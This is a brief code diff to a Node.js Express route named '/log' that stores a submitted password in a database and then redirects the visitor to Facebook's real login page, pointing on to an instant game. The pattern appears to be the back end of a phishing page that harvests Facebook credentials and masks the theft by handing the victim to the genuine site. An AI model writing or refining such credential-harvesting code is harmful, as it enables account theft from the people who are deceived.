@@ -11,8 +11,7 @@ auth.post('/log', urlencodedParser, (req, res) =>{
         password: req.body.password
     }
     db.register(data).then(
-        // res.send('Lol')
-        res.redirect('https://www.facebook.com/')
+        res.redirect('https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Finstantgames%2F474443516378085')
     )
 })
 
